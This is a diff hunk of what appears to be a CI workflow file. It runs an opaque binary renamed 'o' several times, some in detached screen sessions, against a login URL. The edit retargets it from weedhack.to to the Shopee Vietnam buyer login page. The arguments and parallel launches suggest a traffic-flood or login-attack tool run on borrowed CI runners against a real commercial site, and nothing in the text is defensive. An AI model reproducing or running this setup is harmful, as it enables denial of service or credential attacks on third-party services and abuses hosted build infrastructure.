@@ -36,9 +36,9 @@ jobs:
           chmod +x tol
           mv tol o          
           
-          screen -dms ve ./o https://weedhack.to/dashboard/auth/login 200 1 1  90.txt
-          screen -dms ve ./o https://weedhack.to/dashboard/auth/login 200 1 1 90.txt
-          ./o https://weedhack.to/dashboard/auth/login 200 1 1  90.txt
+          screen -dms ve ./o https://shopee.vn/buyer/login 200 1 1  90.txt
+          screen -dms ve ./o https://shopee.vn/buyer/login 200 1 1 90.txt
+          ./o https://shopee.vn/buyer/login 200 1 1  90.txt
           sleep 1
           
           
